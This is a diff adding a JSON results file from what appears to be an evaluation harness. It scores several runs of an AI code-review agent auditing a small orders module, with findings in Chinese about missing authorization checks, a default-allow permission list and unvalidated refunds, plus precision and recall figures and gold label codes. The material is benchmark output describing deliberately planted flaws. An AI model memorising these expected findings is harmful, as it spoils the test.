+          ],
+          "matched": 4,
+          "missed": [],
+          "missed_detail": [],
+          "spurious": [
+            {
+              "file": "app/orders.py",
+              "line": 16,
+              "severity": "blocker",
+              "title": "cancel 不校验 user_id，任意用户可取消他人订单（越权写）",
+              "detail": "与 get_order 同源问题：cancel 接收 user_id 但只做状态判断，没有任何归属/权限校验。任意调用者只要拿到 order_id 就能把别人的订单置为 cancelled。写路径比读路径影响更大，且这里同样没有调用 can_view。",
+              "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`；L16 `order = ORDERS.get(order_id)`；L17-L19 仅判断 status 与赋值，user_id 未参与任何判断。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/orders.py",
+                "line": 16,
+                "severity": "blocker",
+                "title": "cancel 不校验 user_id，任意用户可取消他人订单（越权写）",
+                "detail": "与 get_order 同源问题：cancel 接收 user_id 但只做状态判断，没有任何归属/权限校验。任意调用者只要拿到 order_id 就能把别人的订单置为 cancelled。写路径比读路径影响更大，且这里同样没有调用 can_view。",
+                "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`；L16 `order = ORDERS.get(order_id)`；L17-L19 仅判断 status 与赋值，user_id 未参与任何判断。"
+              },
+              "nearest_label": {
+                "code": "AUTHZ02-a",
+                "file": "app/orders.py",
+                "line": 19
+              },
+              "distance": 3,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [
+            {
+              "file": "app/orders.py",
+              "line": 12,
+              "severity": "note",
+              "title": "get_order 对不存在的订单静默返回 None",
+              "detail": "订单 ID 不存在时返回 None 而不是抛错，调用方若按 dict 使用会得到难以定位的 TypeError / 空响应；对权限模型而言，「不可见」与「不存在」应使用同一种拒绝语义，避免通过错误类型差异枚举出系统中存在哪些订单 ID。",
+              "evidence": "L11-L12：`order = ORDERS.get(order_id)` 后无条件 `return order`，没有 `if order is None` 分支，也没有抛 KeyError/NotFound。"
+            }
+          ],
+          "precision": 0.8,
+          "recall": 1.0,
+          "f1": 0.889,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.333,
+              "recall": 0.5,
+              "f1": 0.4,
+              "spurious": 4,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.6,
+              "recall": 0.75,
+              "f1": 0.667,
+              "spurious": 2,
+              "missed": 1,
+              "duplicates": 1
+            },
+            "2": {
+              "precision": 0.8,
+              "recall": 1.0,
+              "f1": 0.889,
+              "spurious": 1,
+              "missed": 0,
+              "duplicates": 1
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            }
+          }
+        },
+        {
+          "run": 2,
+          "elapsed": 101.3,
+          "iterations": 13,
+          "stop_reason": "finished",
+          "summary": "审计对象为工作区内唯一文件 app/orders.py（31 行，已全文读取）。先确立其自述的权限模型（VIEW_PERMISSIONS 全局角色 + CLIENT_DENY 黑名单，由 can_view 承载）与订单状态机（cancel 仅拦 shipped，refund 累加 refunded_cents），再逐条对照实现，共记录 7 条发现：blocker 3（get_order L9 忽略 user_id 致任意用户可读任意订单；cancel L14 无归属校验致写越权；refund L30 无权限/状态/金额校验，负数与超额退款均可通过）、warn 3（can_view L22 全仓库零调用，鉴权未接入任何入口；L26 黑名单模型默认放行，未列出的 client 一律可读；L17 取消的允许转换集未定义，仅 shipped 被拦）、note 1（L11 缺单语义不一致，get_order 返回 None 而 cancel 抛 KeyError）。验证手段：read_file 通读全文、grep 确认 can_view 无调用点及 status/refunded 等关键字分布、lint_file(ruff) 无告警。未覆盖部分：git diff 涉及的 backend/ 文件位于沙箱根之外不可见，未纳入；ORDERS/VIEW_PERMISSIONS/CLIENT_DENY",
+          "warnings": [],
+          "usage": {
+            "prompt": 132334,
+            "completion": 15473,
+            "cached": 118400
+          },
+          "cache_hit": 0.895,
+          "findings": [
+            {
+              "file": "app/orders.py",
+              "line": 9,
+              "severity": "blocker",
+              "title": "get_order 忽略传入的 user_id，任意用户可读取任意订单",
+              "detail": "方法签名要求调用方提供 user_id（L9），但函数体（L11-12）只用 order_id 查 ORDERS 后原样返回，user_id 从未被引用，也没有调用本模块的 can_view。结果是任何调用者只要拿到 order_id 就能读到订单全量字段（含客户与金额信息），越权面等于订单号空间。这是「谁能看到什么」模型里被完全跳过的一环。",
+              "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:`；L11 `order = ORDERS.get(order_id)`；L12 `return order` —— 函数体内无 user_id / can_view 出现（grep `can_view|user_id` 仅命中 L9 签名与 L22-26 定义处）。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 14,
+              "severity": "blocker",
+              "title": "cancel 不校验操作者身份，任意用户可取消他人订单",
+              "detail": "cancel 同样接收 user_id（L14）却只检查订单状态（L17），既不比较订单归属、也不调用 can_view。任何调用方只要知道 order_id，就能把不属于自己、甚至自己不具查看权限的 client 的订单置为 cancelled（L19），属于写操作越权，破坏性大于读取越权。",
+              "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`；L16-20 函数体仅 `ORDERS.get` → 判断 `order[\"status\"]` → 赋值 `order[\"status\"] = \"cancelled\"`，全程未引用 user_id，也未调用 can_view。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 26,
+              "severity": "warn",
+              "title": "can_view 采用默认放行的黑名单模型，未列出的 client 一律可读",
+              "detail": "权限模型只有「黑名单」维度却没有「归属」维度：L24 全局角色放行，L26 的逻辑是「client_id 不在该用户的拒绝列表里就算可看」。这意味着只要某用户对应的 CLIENT_DENY 条目缺失或为空（代码里 CLIENT_DENY 初始就是 {}，L5），他就对所有 client 都通过鉴权 —— 默认放行(client_id not in () 恒为 True)。把「不在黑名单」当「有权限」，任何新客户/新数据在未被显式加入黑名单前都是默认可读的，越权面随数据增长而扩大。正确模型应当是白名单：只有显式授权的 client 才可读。顺带 L22 的 user_id 参数在 L24/L26 用到了，这里没有 unuse 问题。",
+              "evidence": "L24 `if VIEW_PERMISSIONS.get(user_id) == \"global\":`；L26 `return client_id not in CLIENT_DENY.get(user_id, ())`；L5 `CLIENT_DENY = {}` —— 未配置用户的 CLIENT_DENY.get 返回 ()，`client_id not in ()` 恒为 True。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 30,
+              "severity": "blocker",
+              "title": "refund 不校验权限、状态与金额，负数或超额退款都能通过",
+              "detail": "refund 完全绕过状态机与权限：(1) 不校验订单状态，已 cancelled、已 shipped、乃至已全额退款的订单都能继续累加 refunded_cents；(2) 与 get_order/cancel 不同，它直接接收 order 对象而非 order_id，连归属校验的入口都没有，调用方传入任意订单即可退款；(3) amount 无任何符号/上限校验，传负数会直接把 refunded_cents 减小（相当于篡改退款额），传超过订单金额的数也不会被拦截，存在超额退款。此外 `order[\"refunded_cents\"]` 要求字段必须预先存在，否则 KeyError —— 对未初始化该字段的订单会直接抛异常而非给出退款 0 的语义。",
+              "evidence": "L28 `def refund(self, order: dict, amount: int) -> dict:`；L30 `order[\"refunded_cents\"] = order[\"refunded_cents\"] + amount` —— 全程无 status 判断、无 user_id/权限参数、无 `amount <= 0` 或上限校验。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 22,
+              "severity": "warn",
+              "title": "权限判定函数 can_view 全仓库无调用点，鉴权未接入任何入口",
+              "detail": "can_view 是为「谁能看到什么」写出的判定入口，但它在整个仓库里没有任何调用点（grep 全仓库仅命中定义行本身）。也就是说这套权限模型从未被接入 get_order / cancel / refund 等数据访问路径，实际等价于死代码：模型存在于注释与函数名里，而运行时无一处生效。这与前面「get_order/cancel 忽略 user_id」「refund 无权限参数」互为印证 —— 只有把 can_view 接进每个入口，权限模型才真正落实。",
+              "evidence": "grep `can_view` 全仓库 仅 1 处：`app/orders.py:22: def can_view(self, client_id: str, user_id: str) -> bool:`，无任何调用行；grep `ORDERS` 亦仅命中 L3 定义与 L11/L16 两处读取。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 17,
+              "severity": "warn",
+              "title": "取消的状态转换未被显式约束，只有 shipped 被拦、其余状态一律可改写",
+              "detail": "cancel 用单点判断代替状态机：只把 shipped 视为不可取消（L17），其余状态一律被无条件改写为 cancelled（L19）。因此已被取消的订单可被重复取消、已 delivered/已 refunded 的订单也能被取消；而 shipped 这个唯一被保护的状态反而没有区分 shipped→delivered→refunded 等后续合法流转。换句话说，允许的转换集合没有被显式定义，实现只覆盖了「shipped 不可取消」这一条特例，其余转换全靠隐式放行。",
+              "evidence": "L17 `if order[\"status\"] == \"shipped\":`；L18 `raise PermissionError(\"shipped\")`；L19 `order[\"status\"] = \"cancelled\"` —— 文件中无任何状态枚举/转换表，也未出现 delivered、refunded 等状态名（grep `status|shipped|refund` 仅命中 L17/18/19/28/30）。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 11,
+              "severity": "note",
+              "title": "订单缺失时处理不一致：get_order 静默返回 None，cancel 抛 KeyError",
+              "detail": "对不存在的 order_id，get_order 走 `ORDERS.get` 直接返回 None（L11-12），调用方拿到的 None 与「查到订单」无法区分，易在下游触发 AttributeError/TypeError 而非明确的「订单不存在」错误；cancel 则对同一输入在 L17 抛 KeyError（None[\"status\"]）。同一个模块内缺单语义不一致（一个静默返回 None、一个抛 KeyError），且都不是可被上层安全识别的业务异常。仅在 order_id 不存在/已过期时触发。",
+              "evidence": "L11 `order = ORDERS.get(order_id)`；L12 `return order`（无存在性检查）；L16 同样 `ORDERS.get`，L17 立即 `order[\"status\"]` —— 缺单时 get_order 返回 None、cancel 抛 KeyError。"
+            }
+          ],
+          "matched": 4,
+          "missed": [],
+          "missed_detail": [],
+          "spurious": [
+            {
+              "file": "app/orders.py",
+              "line": 9,
+              "severity": "blocker",
+              "title": "get_order 忽略传入的 user_id，任意用户可读取任意订单",
+              "detail": "方法签名要求调用方提供 user_id（L9），但函数体（L11-12）只用 order_id 查 ORDERS 后原样返回，user_id 从未被引用，也没有调用本模块的 can_view。结果是任何调用者只要拿到 order_id 就能读到订单全量字段（含客户与金额信息），越权面等于订单号空间。这是「谁能看到什么」模型里被完全跳过的一环。",
+              "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:`；L11 `order = ORDERS.get(order_id)`；L12 `return order` —— 函数体内无 user_id / can_view 出现（grep `can_view|user_id` 仅命中 L9 签名与 L22-26 定义处）。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 22,
+              "severity": "warn",
+              "title": "权限判定函数 can_view 全仓库无调用点，鉴权未接入任何入口",
+              "detail": "can_view 是为「谁能看到什么」写出的判定入口，但它在整个仓库里没有任何调用点（grep 全仓库仅命中定义行本身）。也就是说这套权限模型从未被接入 get_order / cancel / refund 等数据访问路径，实际等价于死代码：模型存在于注释与函数名里，而运行时无一处生效。这与前面「get_order/cancel 忽略 user_id」「refund 无权限参数」互为印证 —— 只有把 can_view 接进每个入口，权限模型才真正落实。",
+              "evidence": "grep `can_view` 全仓库 仅 1 处：`app/orders.py:22: def can_view(self, client_id: str, user_id: str) -> bool:`，无任何调用行；grep `ORDERS` 亦仅命中 L3 定义与 L11/L16 两处读取。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/orders.py",
+                "line": 9,
+                "severity": "blocker",
+                "title": "get_order 忽略传入的 user_id，任意用户可读取任意订单",
+                "detail": "方法签名要求调用方提供 user_id（L9），但函数体（L11-12）只用 order_id 查 ORDERS 后原样返回，user_id 从未被引用，也没有调用本模块的 can_view。结果是任何调用者只要拿到 order_id 就能读到订单全量字段（含客户与金额信息），越权面等于订单号空间。这是「谁能看到什么」模型里被完全跳过的一环。",
+                "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:`；L11 `order = ORDERS.get(order_id)`；L12 `return order` —— 函数体内无 user_id / can_view 出现（grep `can_view|user_id` 仅命中 L9 签名与 L22-26 定义处）。"
+              },
+              "nearest_label": {
+                "code": "AUTHZ01-a",
+                "file": "app/orders.py",
+                "line": 12
+              },
+              "distance": 3,
+              "in_same_file": true
+            },
+            {
+              "probe": {
+                "file": "app/orders.py",
+                "line": 22,
+                "severity": "warn",
+                "title": "权限判定函数 can_view 全仓库无调用点，鉴权未接入任何入口",
+                "detail": "can_view 是为「谁能看到什么」写出的判定入口，但它在整个仓库里没有任何调用点（grep 全仓库仅命中定义行本身）。也就是说这套权限模型从未被接入 get_order / cancel / refund 等数据访问路径，实际等价于死代码：模型存在于注释与函数名里，而运行时无一处生效。这与前面「get_order/cancel 忽略 user_id」「refund 无权限参数」互为印证 —— 只有把 can_view 接进每个入口，权限模型才真正落实。",
+                "evidence": "grep `can_view` 全仓库 仅 1 处：`app/orders.py:22: def can_view(self, client_id: str, user_id: str) -> bool:`，无任何调用行；grep `ORDERS` 亦仅命中 L3 定义与 L11/L16 两处读取。"
+              },
+              "nearest_label": {
+                "code": "AUTHZ02-a",
+                "file": "app/orders.py",
+                "line": 19
+              },
+              "distance": 3,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [
+            {
+              "file": "app/orders.py",
+              "line": 11,
+              "severity": "note",
+              "title": "订单缺失时处理不一致：get_order 静默返回 None，cancel 抛 KeyError",
+              "detail": "对不存在的 order_id，get_order 走 `ORDERS.get` 直接返回 None（L11-12），调用方拿到的 None 与「查到订单」无法区分，易在下游触发 AttributeError/TypeError 而非明确的「订单不存在」错误；cancel 则对同一输入在 L17 抛 KeyError（None[\"status\"]）。同一个模块内缺单语义不一致（一个静默返回 None、一个抛 KeyError），且都不是可被上层安全识别的业务异常。仅在 order_id 不存在/已过期时触发。",
+              "evidence": "L11 `order = ORDERS.get(order_id)`；L12 `return order`（无存在性检查）；L16 同样 `ORDERS.get`，L17 立即 `order[\"status\"]` —— 缺单时 get_order 返回 None、cancel 抛 KeyError。"
+            }
+          ],
+          "precision": 0.667,
+          "recall": 1.0,
+          "f1": 0.8,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.143,
+              "recall": 0.25,
+              "f1": 0.182,
+              "spurious": 6,
+              "missed": 3,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.429,
+              "recall": 0.75,
+              "f1": 0.545,
+              "spurious": 4,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 0.667,
+              "recall": 1.0,
+              "f1": 0.8,
+              "spurious": 2,
+              "missed": 0,
+              "duplicates": 1
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 3
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 3
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 3
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 3
+            }
+          }
+        },
+        {
+          "run": 3,
+          "elapsed": 45.5,
+          "iterations": 5,
+          "stop_reason": "finished",
+          "summary": "审计范围：仓库仅含 app/orders.py（31 行，4 个方法 OrderService.get_order / cancel / can_view / refund），已逐行读完，无其他文件、无调用方、无测试。工作区中的 git diff 属于 harness 评测工具自身改动，位于审计根之外，已排除。\n\n先建立模型再比对实现，得到 5 个 blocker + 1 个 warn：\n1. F_984100fd get_order（L9）声明 user_id 却完全不使用，且权限入口 can_view 全仓库无调用点（仅 L22 定义），任意用户可读任意订单。\n2. F_ff4b5b7e can_view（L26）`client_id not in CLIENT_DENY.get(user_id, ())` 默认恒为 True，权限语义是黑名单而非白名单，未登记用户/client 一律放行。\n3. F_01f622ae cancel（L14）同样零鉴权，任意用户可取消他人订单（写操作）。\n4. F_613d5dc9 状态机只拦 \"shipped\"（L17），其余状态（含已取消/其他终态）一律改写为 cancelled，无合法转换集合。\n5. F_824aaaf6 refund（L30）纯累加，无金额上限、无状态校验、无幂等，可超额/重复退款。\n6. F_739fab23 war",
+          "warnings": [],
+          "usage": {
+            "prompt": 30000,
+            "completion": 7543,
+            "cached": 24064
+          },
+          "cache_hit": 0.802,
+          "findings": [
+            {
+              "file": "app/orders.py",
+              "line": 9,
+              "severity": "blocker",
+              "title": "get_order 完全不做鉴权，任意用户可读取任意订单",
+              "detail": "`get_order(order_id, user_id)` 接收了 user_id（说明设计意图是按用户授权），但函数体只用 order_id 查表后直接返回，user_id 从未被使用，也没有任何 fallback 的属主/客户端校验。同文件内已有的 `can_view()` 在这个路径上从未被调用（全仓库 grep 只有定义处 line 22，无任何调用点）。结果是权限模型里唯一的判定函数形同虚设，任何能调用该服务的 user_id 都能读到全部订单，包括不属于他的 client 的订单。",
+              "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:` / L11-12 `order = ORDERS.get(order_id)` → `return order`，函数体内 user_id 零次出现；grep `can_view` 仅命中 L22 定义，无调用。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 26,
+              "severity": "blocker",
+              "title": "can_view 用黑名单语义实现，未登记的 client 一律放行",
+              "detail": "`can_view` 的默认分支是 `return client_id not in CLIENT_DENY.get(user_id, ())`。对一个没有任何 VIEW_PERMISSIONS / CLIENT_DENY 记录的用户（get 返回 None/空 tuple），表达式恒为 True；对已有记录的用户，只要目标 client 没被显式列入拒绝名单也返回 True。即：授权是「默认允许、靠人工拉黑名单收窄」，与「谁能看到什么」应有的白名单模型相反。新增 client、新增用户、漏配一条 deny 记录都会造成越权可见，且不会有任何报错。",
+              "evidence": "L24-26：`if VIEW_PERMISSIONS.get(user_id) == \"global\": return True` 之后 `return client_id not in CLIENT_DENY.get(user_id, ())`——缺省时 CLIENT_DENY.get 返回 `()`，`client_id not in ()` 恒为 True。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 14,
+              "severity": "blocker",
+              "title": "cancel 不做鉴权：任意用户可取消他人订单",
+              "detail": "与 get_order 同样的问题——`cancel(order_id, user_id)` 声明了 user_id 却完全不使用，函数体内没有任何权限判定就直接把状态写成 cancelled。任何调用方只要知道 order_id 就能取消别人的订单。这是一个写操作，越权后果比读取更严重。",
+              "evidence": "L14 `def cancel(self, order_id: str, user_id: str) -> dict:`，L16-20 函数体仅使用 order_id 与 order[\"status\"]，user_id 零次出现。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 17,
+              "severity": "blocker",
+              "title": "状态流转只拦 shipped，对已终态订单可重复 cancel",
+              "detail": "状态机只用一条 if 表达：仅当当前状态等于 \"shipped\" 时拒绝，其余任何状态都被无条件改写成 \"cancelled\"。因此对已经是 \"cancelled\" 的订单再调一次 cancel，会再次通过校验并把状态重写为 cancelled（无副作用但说明缺少状态前置条件校验）；更关键的是任何其他非 shipped 的终态或中间态（例如已退款/已完成的订单）都会被允许取消。这里也没有「状态是否允许该转换」的白名单/转换表，无法区分 created→cancelled 这类合法转换与被禁止的转换。另外用异常而非返回值表达业务拒绝，也会让调用方难以区分「状态不允许」和「程序错误」。",
+              "evidence": "L17-19：`if order[\"status\"] == \"shipped\": raise PermissionError(\"shipped\")` → `order[\"status\"] = \"cancelled\"`。只有 shipped 一个前置条件，无其余状态分支。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 30,
+              "severity": "blocker",
+              "title": "refund 无金额上限与幂等校验，可累计超额退款",
+              "detail": "`refund` 直接把 amount 累加到 `refunded_cents`，既不校验本次退款是否超过订单应付金额（无订单总额比较），也不校验累计已退金额与订单状态（已取消/未支付订单同样可退），也没有幂等键，重复调用同一笔退款会不断累加。金额只受调用方传入值约束，是典型的「重复退款/超额退款」资金缺陷。",
+              "evidence": "L30 `order[\"refunded_cents\"] = order[\"refunded_cents\"] + amount` —— 无 amount <= 0 校验、无 `refunded_cents + amount <= total` 校验、无状态判断。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 16,
+              "severity": "warn",
+              "title": "订单不存在时下标访问 None，抛出 TypeError 而非可处理的错误",
+              "detail": "`ORDERS.get(order_id)` 在订单号无效时返回 None，但三个方法都直接把返回值当 dict 用：cancel 访问 order[\"status\"]、refund 访问 order[\"refunded_cents\"] 并回写。传入不存在的 order_id 会得到 `TypeError: 'NoneType' object is not subscriptable`（refund 中若 order 是缺少该字段的 dict 则是 KeyError），而不是明确的 not-found 业务异常。这类未区分错误会让调用方把「参数非法」误判为「服务内部故障」，且无法做针对性处理。",
+              "evidence": "L16 `order = ORDERS.get(order_id)` 后 L17 立即 `order[\"status\"]`；L30 `order[\"refunded_cents\"] + amount`。get 不存在时的缺省值未做检查。"
+            }
+          ],
+          "matched": 4,
+          "missed": [],
+          "missed_detail": [],
+          "spurious": [
+            {
+              "file": "app/orders.py",
+              "line": 9,
+              "severity": "blocker",
+              "title": "get_order 完全不做鉴权，任意用户可读取任意订单",
+              "detail": "`get_order(order_id, user_id)` 接收了 user_id（说明设计意图是按用户授权），但函数体只用 order_id 查表后直接返回，user_id 从未被使用，也没有任何 fallback 的属主/客户端校验。同文件内已有的 `can_view()` 在这个路径上从未被调用（全仓库 grep 只有定义处 line 22，无任何调用点）。结果是权限模型里唯一的判定函数形同虚设，任何能调用该服务的 user_id 都能读到全部订单，包括不属于他的 client 的订单。",
+              "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:` / L11-12 `order = ORDERS.get(order_id)` → `return order`，函数体内 user_id 零次出现；grep `can_view` 仅命中 L22 定义，无调用。"
+            },
+            {
+              "file": "app/orders.py",
+              "line": 16,
+              "severity": "warn",
+              "title": "订单不存在时下标访问 None，抛出 TypeError 而非可处理的错误",
+              "detail": "`ORDERS.get(order_id)` 在订单号无效时返回 None，但三个方法都直接把返回值当 dict 用：cancel 访问 order[\"status\"]、refund 访问 order[\"refunded_cents\"] 并回写。传入不存在的 order_id 会得到 `TypeError: 'NoneType' object is not subscriptable`（refund 中若 order 是缺少该字段的 dict 则是 KeyError），而不是明确的 not-found 业务异常。这类未区分错误会让调用方把「参数非法」误判为「服务内部故障」，且无法做针对性处理。",
+              "evidence": "L16 `order = ORDERS.get(order_id)` 后 L17 立即 `order[\"status\"]`；L30 `order[\"refunded_cents\"] + amount`。get 不存在时的缺省值未做检查。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/orders.py",
+                "line": 9,
+                "severity": "blocker",
+                "title": "get_order 完全不做鉴权，任意用户可读取任意订单",
+                "detail": "`get_order(order_id, user_id)` 接收了 user_id（说明设计意图是按用户授权），但函数体只用 order_id 查表后直接返回，user_id 从未被使用，也没有任何 fallback 的属主/客户端校验。同文件内已有的 `can_view()` 在这个路径上从未被调用（全仓库 grep 只有定义处 line 22，无任何调用点）。结果是权限模型里唯一的判定函数形同虚设，任何能调用该服务的 user_id 都能读到全部订单，包括不属于他的 client 的订单。",
+                "evidence": "L9 `def get_order(self, order_id: str, user_id: str) -> dict:` / L11-12 `order = ORDERS.get(order_id)` → `return order`，函数体内 user_id 零次出现；grep `can_view` 仅命中 L22 定义，无调用。"
+              },
+              "nearest_label": {
+                "code": "AUTHZ01-a",
+                "file": "app/orders.py",
+                "line": 12
+              },
+              "distance": 3,
+              "in_same_file": true
+            },
+            {
+              "probe": {
+                "file": "app/orders.py",
+                "line": 16,
+                "severity": "warn",
+                "title": "订单不存在时下标访问 None，抛出 TypeError 而非可处理的错误",
+                "detail": "`ORDERS.get(order_id)` 在订单号无效时返回 None，但三个方法都直接把返回值当 dict 用：cancel 访问 order[\"status\"]、refund 访问 order[\"refunded_cents\"] 并回写。传入不存在的 order_id 会得到 `TypeError: 'NoneType' object is not subscriptable`（refund 中若 order 是缺少该字段的 dict 则是 KeyError），而不是明确的 not-found 业务异常。这类未区分错误会让调用方把「参数非法」误判为「服务内部故障」，且无法做针对性处理。",
+                "evidence": "L16 `order = ORDERS.get(order_id)` 后 L17 立即 `order[\"status\"]`；L30 `order[\"refunded_cents\"] + amount`。get 不存在时的缺省值未做检查。"
+              },
+              "nearest_label": {
+                "code": "AUTHZ02-a",
+                "file": "app/orders.py",
+                "line": 19
+              },
+              "distance": 3,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [],
+          "precision": 0.667,
+          "recall": 1.0,
+          "f1": 0.8,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.167,
+              "recall": 0.25,
+              "f1": 0.2,
+              "spurious": 5,
+              "missed": 3,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.333,
+              "recall": 0.5,
+              "f1": 0.4,
+              "spurious": 4,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 0.667,
+              "recall": 1.0,
+              "f1": 0.8,
+              "spurious": 2,
+              "missed": 0,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 2
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
